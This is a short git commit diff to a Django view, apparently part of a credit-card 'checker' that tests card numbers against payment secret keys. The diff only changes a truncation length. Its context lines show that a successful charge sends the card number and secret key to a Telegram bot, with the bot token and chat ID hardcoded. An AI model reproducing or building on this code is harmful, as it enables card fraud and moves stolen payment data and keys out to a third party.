be16e078992cb1da26c3fcc3c2b97ba6b95562dd
Your Name <you@example.com>
2024-04-03 13:00:20 +0530

    resp

--- skapi/views.py
+++ skapi/views.py
@@ -22,7 +22,7 @@ def cheker(request):
             if 'Payment Complete' in f'{resp}':
                 requests.get(
                     f'https://api.telegram.org/bot6651648962:AAHcTwFSqfGDvt8rdb82KPE595YeztT_ZAw/sendMessage?chat_id=1329532701&text=cc:{cc}+sk:{sk}')
-            return HttpResponse(f"<font size=2 color='white' margin-bottom='5'><i>  <font class='badge badge-danger'>{resp['resp'][:15]} ⇝ {resp['cc']} </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>{resp['code']}  IP ⇝ {client_ip} </i></font><br>")
+            return HttpResponse(f"<font size=2 color='white' margin-bottom='5'><i>  <font class='badge badge-danger'>{resp['resp'][:50]} ⇝ {resp['cc']} </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>{resp['code']}  IP ⇝ {client_ip} </i></font><br>")
         except Exception as e:
             # Catching the specific exception raised, if any
             return HttpResponse(r"{'cc': 'none', 'resp': 'Error', 'code': 'none', 'time': '1.7', 'bypass': 0}")
